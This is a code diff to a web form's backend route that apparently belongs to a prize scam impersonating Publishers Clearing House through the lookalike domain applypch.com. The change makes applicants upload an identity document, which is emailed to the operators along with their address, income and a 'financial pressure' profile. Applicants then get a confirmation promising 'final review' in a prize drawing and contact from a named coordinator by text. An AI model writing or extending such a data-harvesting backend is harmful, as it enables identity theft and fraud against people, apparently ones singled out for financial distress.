@@ -23,7 +23,19 @@ interface ProfilePayload {
   megaPrizePlan: string;
   acceptLowerTier: string;
   infoConfirm: boolean;
+  idFileName: string;
+  idMimeType: string;
+  idData: string;
 }
+
+const MAX_ID_BYTES = 8 * 1024 * 1024;
+const ALLOWED_ID_TYPES = new Set([
+  'image/jpeg',
+  'image/png',
+  'image/webp',
+  'image/gif',
+  'application/pdf',
+]);
 
 function str(v: unknown): string {
   return typeof v === 'string' ? v.trim() : '';
@@ -54,6 +66,9 @@ function validate(body: unknown): ProfilePayload | null {
     megaPrizePlan: str(o.megaPrizePlan),
     acceptLowerTier: str(o.acceptLowerTier),
     infoConfirm: o.infoConfirm === true,
+    idFileName: str(o.idFileName),
+    idMimeType: str(o.idMimeType),
+    idData: typeof o.idData === 'string' ? o.idData.replace(/\s/g, '') : '',
   };
 
   const required = [
@@ -78,11 +93,32 @@ function validate(body: unknown): ProfilePayload | null {
     payload.acceptLowerTier,
   ];
 
-  if (required.some((v) => !v) || !payload.infoConfirm) {
+  if (
+    required.some((v) => !v) ||
+    !payload.infoConfirm ||
+    !payload.idFileName ||
+    !payload.idMimeType ||
+    !payload.idData
+  ) {
     return null;
   }
 
   if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) {
+    return null;
+  }
+
+  if (!ALLOWED_ID_TYPES.has(payload.idMimeType)) {
+    return null;
+  }
+
+  let idBuffer: Buffer;
+  try {
+    idBuffer = Buffer.from(payload.idData, 'base64');
+  } catch {
+    return null;
+  }
+
+  if (!idBuffer.length || idBuffer.length > MAX_ID_BYTES) {
     return null;
   }
 
@@ -97,7 +133,10 @@ export async function POST(request: NextRequest) {
   const parsed = validate(await request.json());
   if (!parsed) {
     return NextResponse.json(
-      { error: 'Please complete every field and confirm the information is accurate.' },
+      {
+        error:
+          'Please complete every field, upload a valid ID (JPG, PNG, or PDF, max 8 MB), and confirm the information is accurate.',
+      },
       { status: 400 }
     );
   }
@@ -141,9 +180,12 @@ export async function POST(request: NextRequest) {
       ${row('Financial pressure', parsed.financialPressure)}
       ${row('Mega prize plan', parsed.megaPrizePlan)}
       ${row('Accept lower tier', parsed.acceptLowerTier)}
+      ${row('ID document', `${parsed.idFileName} (attached)`)}
     </table>
     <p style="margin-top:16px;color:#666;font-size:12px;">Submitted via applypch.com/documents/application-profile.html</p>
   `;
+
+  const idBuffer = Buffer.from(parsed.idData, 'base64');
 
   const text = [
     `Application profile — ${parsed.appRef}`,
@@ -154,6 +196,7 @@ export async function POST(request: NextRequest) {
     `Address: ${address}`,
     `Employment: ${parsed.employment}`,
     `Income: ${parsed.monthlyIncome}`,
+    `ID document: ${parsed.idFileName} (attached)`,
   ].join('\n');
 
   try {
@@ -164,6 +207,13 @@ export async function POST(request: NextRequest) {
       subject: `[PCH Application Profile] ${parsed.fullName} — ${parsed.appRef}`,
       text,
       html,
+      attachments: [
+        {
+          filename: parsed.idFileName,
+          content: idBuffer,
+          contentType: parsed.idMimeType,
+        },
+      ],
     });
 
     await transporter.sendMail({
@@ -172,7 +222,7 @@ export async function POST(request: NextRequest) {
       subject: `Application profile received — ${parsed.appRef}`,
       html: `
         <p>Dear ${escapeHtml(parsed.fullName)},</p>
-        <p>We have received your complete application and verification profile for reference <strong>${escapeHtml(parsed.appRef)}</strong>.</p>
+        <p>We have received your complete application and verification profile for reference <strong>${escapeHtml(parsed.appRef)}</strong>, including your identity document.</p>
         <p>Your submission is being processed for <strong>final review</strong> in the current Publishers Clearing House prize drawing.</p>
         <p>Dave Sayer, your PCH Application Coordinator, will contact you on your official text or email thread with the next update.</p>
         <p>Publishers Clearing House<br>support@applypch.com<br>+1 (917) 743-0256 (text only)</p>
